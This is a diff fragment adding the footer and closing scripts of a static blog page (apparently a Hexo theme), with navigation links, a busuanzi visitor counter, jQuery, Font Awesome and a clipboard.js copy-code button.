+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    ta3shi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">Home</a></li><!--
+    --><!--
+      --><li><a href="/about/">About</a></li><!--
+    --><!--
+      --><li><a href="/tags/">Tags</a></li><!--
+    --><!--
+      --><li><a href="/categories/">Categories</a></li><!--
+    --><!--
+      --><li><a href="/search/">Search</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
